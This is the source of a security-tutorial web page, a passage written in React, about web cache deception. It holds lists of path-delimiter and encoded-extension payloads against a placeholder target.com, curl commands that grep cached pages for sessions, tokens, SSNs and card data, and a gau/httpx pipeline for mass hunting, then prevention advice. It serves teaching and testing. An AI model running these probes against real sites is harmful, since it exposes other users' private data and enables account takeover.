        <div className="mt-4 rounded-lg border border-border bg-card">
          <div className="flex flex-col p-4 font-mono text-sm text-foreground">
            <span className="py-0.5 break-all">https://target.com/account;.js?test=123</span><span className="py-0.5 break-all">https://target.com/profile;.css?test=123</span><span className="py-0.5 break-all">https://target.com/settings;.jpeg?test=123</span><span className="py-0.5 break-all">https://target.com/dashboard;.jpg?test=123</span><span className="py-0.5 break-all">https://target.com/user;.png?test=123</span><span className="py-0.5 break-all">https://target.com/admin;.gif?test=123</span><span className="py-0.5 break-all">https://target.com/private;.woff?test=123</span><span className="py-0.5 break-all">https://target.com/account;.woff2?test=123</span><span className="py-0.5 break-all">https://target.com/profile;.ttf?test=123</span><span className="py-0.5 break-all">https://target.com/settings;.otf?test=123</span><span className="py-0.5 break-all">https://target.com/dashboard;.svg?test=123</span><span className="py-0.5 break-all">https://target.com/user;.html?test=123</span><span className="py-0.5 break-all">https://target.com/admin;.xml?test=123</span><span className="py-0.5 break-all">https://target.com/private;.json?test=123</span>
          </div>
        </div>

        <h3 className="mb-3 mt-8 text-lg font-semibold text-foreground">Encoded Delimiter Testing</h3>
        <p className="mb-4 text-muted-foreground leading-relaxed">
          Use URL-encoded special characters before file extensions to bypass cache rules:
        </p>

        <div className="rounded-lg border border-border bg-card">
          <div className="border-b border-border bg-muted px-4 py-2 text-xs font-medium text-muted-foreground">%60.ext?test=123</div>
          <div className="flex flex-col p-4 text-sm font-mono text-foreground">
            <span>%60.js?test=123</span><span>%60.css?test=123</span><span>%60.jpeg?test=123</span><span>%60.jpg?test=123</span><span>%60.png?test=123</span><span>%60.gif?test=123</span><span>%60.woff?test=123</span><span>%60.woff2?test=123</span><span>%60.ttf?test=123</span><span>%60.otf?test=123</span><span>%60.svg?test=123</span><span>%60.html?test=123</span><span>%60.xml?test=123</span><span>%60.json?test=123</span><span>%60.mp4?test=123</span><span>%60.ico?test=123</span><span>%60.txt?test=123</span><span>%60.pdf?test=123</span><span>%60.zip?test=123</span><span>%60.csv?test=123</span>
          </div>
        </div>

        <div className="mt-4 rounded-lg border border-border bg-card">
          <div className="flex flex-col p-4 font-mono text-sm text-foreground">
            <span className="py-0.5 break-all">https://target.com/account%60.js?test=123</span><span className="py-0.5 break-all">https://target.com/profile%60.css?test=123</span><span className="py-0.5 break-all">https://target.com/settings%60.jpeg?test=123</span><span className="py-0.5 break-all">https://target.com/dashboard%60.jpg?test=123</span><span className="py-0.5 break-all">https://target.com/user%60.png?test=123</span><span className="py-0.5 break-all">https://target.com/admin%60.gif?test=123</span><span className="py-0.5 break-all">https://target.com/private%60.woff?test=123</span><span className="py-0.5 break-all">https://target.com/account%60.woff2?test=123</span><span className="py-0.5 break-all">https://target.com/profile%60.ttf?test=123</span><span className="py-0.5 break-all">https://target.com/settings%60.otf?test=123</span><span className="py-0.5 break-all">https://target.com/dashboard%60.svg?test=123</span><span className="py-0.5 break-all">https://target.com/user%60.html?test=123</span><span className="py-0.5 break-all">https://target.com/admin%60.xml?test=123</span><span className="py-0.5 break-all">https://target.com/private%60.json?test=123</span>
          </div>
        </div>

        <h3 className="mb-3 mt-8 text-lg font-semibold text-foreground">Advanced Testing Combinations</h3>
        <p className="mb-4 text-muted-foreground leading-relaxed">
          Test URLs by appending file extensions combined with /* to trick caches into storing sensitive responses:
        </p>

        <div className="rounded-lg border border-border bg-card">
          <div className="border-b border-border bg-muted px-4 py-2 text-xs font-medium text-muted-foreground">.ext/*</div>
          <div className="flex flex-col p-4 text-sm font-mono text-foreground">
            <span>.js/*</span><span>.css/*</span><span>.jpeg/*</span><span>.jpg/*</span><span>.png/*</span><span>.gif/*</span><span>.woff/*</span><span>.woff2/*</span><span>.ttf/*</span><span>.otf/*</span><span>.svg/*</span><span>.html/*</span><span>.xml/*</span><span>.json/*</span><span>.mp4/*</span><span>.webm/*</span><span>.ico/*</span><span>.txt/*</span><span>.pdf/*</span><span>.doc/*</span><span>.xls/*</span><span>.ppt/*</span><span>.mp3/*</span><span>.ogg/*</span><span>.wav/*</span><span>.csv/*</span><span>.zip/*</span><span>.tar/*</span><span>.gz/*</span><span>.bz2/*</span><span>.7z/*</span><span>.webp/*</span><span>.bmp/*</span><span>.mpg/*</span><span>.avi/*</span><span>.mkv/*</span><span>.flv/*</span><span>.wmv/*</span><span>.rss/*</span><span>.atom/*</span><span>.yaml/*</span><span>.log/*</span><span>.jar/*</span><span>.jsp/*</span><span>.aspx/*</span><span>.shtml/*</span><span>.xhtml/*</span><span>.map/*</span>
          </div>
        </div>

        <div className="mt-4 rounded-lg border border-border bg-card">
          <div className="flex flex-col p-4 font-mono text-sm text-foreground">
            <span className="py-0.5 break-all">https://target.com/account.js/*</span><span className="py-0.5 break-all">https://target.com/profile.css/*</span><span className="py-0.5 break-all">https://target.com/settings.jpeg/*</span><span className="py-0.5 break-all">https://target.com/dashboard.jpg/*</span><span className="py-0.5 break-all">https://target.com/user.png/*</span><span className="py-0.5 break-all">https://target.com/admin.gif/*</span><span className="py-0.5 break-all">https://target.com/private.woff/*</span><span className="py-0.5 break-all">https://target.com/account.woff2/*</span><span className="py-0.5 break-all">https://target.com/profile.ttf/*</span><span className="py-0.5 break-all">https://target.com/settings.otf/*</span><span className="py-0.5 break-all">https://target.com/dashboard.svg/*</span><span className="py-0.5 break-all">https://target.com/user.html/*</span><span className="py-0.5 break-all">https://target.com/admin.xml/*</span><span className="py-0.5 break-all">https://target.com/private.json/*</span>
          </div>
        </div>

        <h3 className="mb-3 mt-8 text-lg font-semibold text-foreground">Real-World Examples</h3>

        <h4 className="mb-2 font-medium text-foreground">Profile Page Poisoning</h4>
        <p className="mb-4 text-muted-foreground leading-relaxed">
          Discovery: A tester noticed that /user/profile contained sensitive user information.<br />
          Testing: The tester appended a static extension to the URL: /user/profile.css<br />
          Verification: After logging out and accessing /user/profile.css in incognito, the same sensitive data was returned.<br />
          Root Cause: The CDN was caching based on the file extension, treating the .css URL as a static resource while the backend still processed it as a profile request.
        </p>
        <div className="rounded-lg border border-border bg-card">
          <div className="flex flex-col p-4 font-mono text-sm text-foreground">
            <span className="py-0.5 break-all">curl -I https://target.com/user/profile.css</span><span className="py-0.5 break-all">curl https://target.com/user/profile.css | grep -iE 'email|username|session|token|ssn|credit|phone'</span>
          </div>
        </div>

        <h4 className="mb-2 mt-6 font-medium text-foreground">API Endpoint Manipulation</h4>
        <p className="mb-4 text-muted-foreground leading-relaxed">
          Discovery: An API endpoint at /api/user/data returned JSON with user-specific information.<br />
          Testing: The tester added a cache-busting parameter with a static extension: /api/user/data?callback=static.js<br />
          Verification: When accessed without authentication, the endpoint returned the cached user data.<br />
          Root Cause: The CDN was configured to cache based on the presence of certain query parameters.
        </p>
        <div className="rounded-lg border border-border bg-card">
          <div className="flex flex-col p-4 font-mono text-sm text-foreground">
            <span className="py-0.5 break-all">curl -I 'https://target.com/api/user/data?callback=static.js'</span><span className="py-0.5 break-all">curl 'https://target.com/api/user/data?callback=static.js'</span>
          </div>
        </div>
      </section>

      {/* —————————— Automation & Checklist —————————— */}
      <section id="automation" className="scroll-mt-24">
        <div className="mb-6 flex items-center gap-3">
          <div className="flex h-10 w-10 items-center justify-center rounded-lg bg-amber-500/10 text-amber-500">
            <FileText className="h-5 w-5" />
          </div>
          <div>
            <span className="text-xs font-medium text-amber-500">Phase 7</span>
            <h2 className="text-2xl font-bold text-foreground">Mass Hunting & Automation</h2>
          </div>
        </div>

        <h3 className="mb-3 text-lg font-semibold text-foreground">Simple Exploitation Checklist</h3>
        <ol className="mb-6 space-y-3 text-muted-foreground list-decimal list-inside">
          <li>Identify private endpoint</li>
          <li>Append static-like extension</li>
          <li>Test caching: <code className="rounded bg-muted px-1.5 py-0.5 text-sm">curl -I https://target.com/account.css</code></li>
          <li>Look for cache hit headers</li>
          <li>Verify sensitive content exposure</li>
          <li>Try multiple variations for bypass</li>
        </ol>

        <h3 className="mb-3 text-lg font-semibold text-foreground">Automation Commands</h3>
        <p className="mb-4 text-muted-foreground leading-relaxed">
          Use these one-liner automations to hunt Web Cache Deception vulnerabilities at scale:
        </p>

        <div className="rounded-lg border border-border bg-card">
          <div className="flex flex-col p-4 font-mono text-sm text-foreground">
            <span className="py-0.5 break-all text-xs">gau target.com | grep -E '/(account|profile|dashboard|settings|user|admin|private|my-account|user/profile|dashboard/image|dashboard/profile|account/user|address|account/settings|profile/edit|user/settings|admin/panel|private/files|my-account/orders|user/details|dashboard/reports|account/profile|account/info|profile/view|admin/settings|private/data|my-account/settings|user/account)(\?|/|$)' {'>'} urls.txt</span><span className="py-0.5 break-all text-xs">cat urls.txt | while read url; do echo "$url/style.css"; done | httpx-toolkit -mc 200 -title -cl</span>
          </div>
        </div>

        <p className="mt-4 text-sm text-muted-foreground leading-relaxed">
          This pipeline does the following: Gets all URLs for the target domain using gau. Filters URLs to only keep those with sensitive paths like /account, /profile, /admin, etc. Saves the filtered URLs to a file. Appends /style.css to each URL to mimic a static file (a common cache deception trick). Uses httpx-toolkit to check which URLs respond with HTTP 200, showing live pages that might be cached improperly.
        </p>

        <h3 className="mb-3 mt-8 text-lg font-semibold text-foreground">Recommended Tools</h3>

        <div className="rounded-lg border border-border bg-card">
          <div className="flex flex-col p-4 font-mono text-sm text-foreground">
            <span className="py-0.5 break-all">https://github.com/PortSwigger/web-cache-deception-scanner</span><span className="py-0.5 break-all">https://portswigger.net/web-security/web-cache-deception</span>
          </div>
        </div>

        <div className="mt-6 grid gap-4 sm:grid-cols-2">
          <div className="overflow-hidden rounded-lg border border-border cursor-pointer" onClick={() => setExpandedImg("/images/vulnerabilities/cache-deception/1_iH7QDDM-x5P9gPAn-GtNVQ.webp")}>
            <Image src="/images/vulnerabilities/cache-deception/1_iH7QDDM-x5P9gPAn-GtNVQ.webp" alt="Web Cache Deception Scanner tool" width={600} height={338} className="w-full" style={{ height: "auto" }} unoptimized />
          </div>
          <div className="overflow-hidden rounded-lg border border-border cursor-pointer" onClick={() => setExpandedImg("/images/vulnerabilities/cache-deception/1_EA9YF1swfX_hVWkphY9LvA.webp")}>
            <Image src="/images/vulnerabilities/cache-deception/1_EA9YF1swfX_hVWkphY9LvA.webp" alt="PortSwigger WCD practice lab" width={600} height={338} className="w-full" style={{ height: "auto" }} unoptimized />
          </div>
        </div>
      </section>

      {/* —————————— Prevention —————————— */}
      <section id="prevention" className="scroll-mt-24">
        <div className="mb-6 flex items-center gap-3">
          <div className="flex h-10 w-10 items-center justify-center rounded-lg bg-amber-500/10 text-amber-500">
            <CheckCircle className="h-5 w-5" />
          </div>
          <div>
            <span className="text-xs font-medium text-amber-500">Phase 8</span>
            <h2 className="text-2xl font-bold text-foreground">Prevention and Mitigation</h2>
          </div>
        </div>

        <div className="space-y-4">
          <div className="rounded-lg border border-border bg-card p-4">
            <h3 className="mb-2 font-semibold text-foreground">Proper Cache-Control Headers</h3>
            <p className="text-sm text-muted-foreground">Ensure sensitive endpoints include: Cache-Control: no-store, no-cache, private</p>
          </div>
          <div className="rounded-lg border border-border bg-card p-4">
            <h3 className="mb-2 font-semibold text-foreground">Cache Key Configuration</h3>
            <p className="text-sm text-muted-foreground">Configure caches to include authentication status or session identifiers in cache keys</p>
          </div>
          <div className="rounded-lg border border-border bg-card p-4">
            <h3 className="mb-2 font-semibold text-foreground">URL Normalization</h3>
            <p className="text-sm text-muted-foreground">Implement URL normalization to prevent encoded paths from bypassing cache rules</p>
          </div>
          <div className="rounded-lg border border-border bg-card p-4">
            <h3 className="mb-2 font-semibold text-foreground">Static Resource Segregation</h3>
            <p className="text-sm text-muted-foreground">Host static resources on separate domains or subdomains with different caching policies</p>
          </div>
        </div>
      </section>

      {/* —————————— Conclusion —————————— */}
      <section className="scroll-mt-24">
        <div className="rounded-xl border border-amber-500/20 bg-gradient-to-br from-amber-500/5 via-background to-orange-500/5 p-8">
          <h2 className="mb-4 text-2xl font-bold text-foreground text-center">Conclusion</h2>
          <p className="text-center text-muted-foreground leading-relaxed max-w-3xl mx-auto">
            Web cache deception is a powerful attack vector that can expose sensitive information and bypass security measures. By understanding the default paths, sensitive headers and various techniques to manipulate caching behavior you can identify and exploit these vulnerabilities effectively. Always remember to use tools like the Gift of Speed Cache Checker to analyze caching behavior and uncover potential weaknesses.
          </p>
          <p className="mt-4 text-center text-sm text-muted-foreground">
            You can also watch this video walkthrough showing the full practical demonstration of these methods in action, including account takeover:
          </p>
          <div className="mt-4 text-center">
            <a
              href="https://www.youtube.com/watch?v=Epzi1fWwdKk"
              target="_blank"
              rel="noopener noreferrer"
              className="inline-flex items-center gap-2 rounded-lg bg-amber-500/10 px-4 py-2 text-sm font-medium text-amber-500 hover:bg-amber-500/20"
            >
              <Video className="h-4 w-4" />
              Watch Full Walkthrough
              <ExternalLink className="h-3 w-3" />
            </a>
          </div>
        </div>
      </section>

      {/* —————————— Tools & Resources —————————— */}
      <section className="scroll-mt-24">
        <div className="mb-6 flex items-center gap-3">
          <div className="flex h-10 w-10 items-center justify-center rounded-lg bg-amber-500/10 text-amber-500">
            <ExternalLink className="h-5 w-5" />
          </div>
          <div>
            <span className="text-xs font-medium text-amber-500">Tools</span>
            <h2 className="text-2xl font-bold text-foreground">Tools & Resources</h2>
          </div>
        </div>
        <div className="grid gap-3 sm:grid-cols-2">
          <a href="https://github.com/PortSwigger/web-cache-deception-scanner" target="_blank" rel="noopener noreferrer"
            className="group flex items-start gap-3 rounded-lg border border-border bg-card p-4 transition-all hover:border-amber-500/50 hover:shadow-lg hover:shadow-amber-500/5">
            <div className="flex h-8 w-8 shrink-0 items-center justify-center rounded-md bg-amber-500/10 text-amber-500">
              <Bug className="h-4 w-4" />
            </div>
            <div className="min-w-0 flex-1">
              <div className="font-medium text-foreground group-hover:text-amber-500">Web Cache Deception Scanner (PortSwigger)</div>
              <p className="mt-1 text-sm text-muted-foreground line-clamp-2">Burp Suite extension for automated web cache deception scanning</p>
            </div>
          </a>
          <a href="https://portswigger.net/web-security/web-cache-deception" target="_blank" rel="noopener noreferrer"
            className="group flex items-start gap-3 rounded-lg border border-border bg-card p-4 transition-all hover:border-amber-500/50 hover:shadow-lg hover:shadow-amber-500/5">
            <div className="flex h-8 w-8 shrink-0 items-center justify-center rounded-md bg-amber-500/10 text-amber-500">
              <BookOpen className="h-4 w-4" />
            </div>
            <div className="min-w-0 flex-1">
              <div className="font-medium text-foreground group-hover:text-amber-500">PortSwigger WCD Lab</div>
              <p className="mt-1 text-sm text-muted-foreground line-clamp-2">Interactive practice lab for web cache deception</p>
            </div>
          </a>
          <a href="https://www.giftofspeed.com/cache-checker/" target="_blank" rel="noopener noreferrer"
            className="group flex items-start gap-3 rounded-lg border border-border bg-card p-4 transition-all hover:border-amber-500/50 hover:shadow-lg hover:shadow-amber-500/5">
            <div className="flex h-8 w-8 shrink-0 items-center justify-center rounded-md bg-amber-500/10 text-amber-500">
              <Search className="h-4 w-4" />
            </div>
            <div className="min-w-0 flex-1">
              <div className="font-medium text-foreground group-hover:text-amber-500">GiftOfSpeed Cache Checker</div>
              <p className="mt-1 text-sm text-muted-foreground line-clamp-2">Online tool to analyze HTTP responses and determine if a resource is cached</p>
            </div>
          </a>
          <a href="https://www.youtube.com/watch?v=Epzi1fWwdKk" target="_blank" rel="noopener noreferrer"
            className="group flex items-start gap-3 rounded-lg border border-border bg-card p-4 transition-all hover:border-amber-500/50 hover:shadow-lg hover:shadow-amber-500/5">
            <div className="flex h-8 w-8 shrink-0 items-center justify-center rounded-md bg-amber-500/10 text-amber-500">
              <Video className="h-4 w-4" />
            </div>
            <div className="min-w-0 flex-1">
              <div className="font-medium text-foreground group-hover:text-amber-500">YouTube: Full WCD Walkthrough</div>
              <p className="mt-1 text-sm text-muted-foreground line-clamp-2">Full practical demonstration including account takeover via cache deception</p>
            </div>
          </a>
        </div>
      </section>
    </ContentLayout>
  )
}
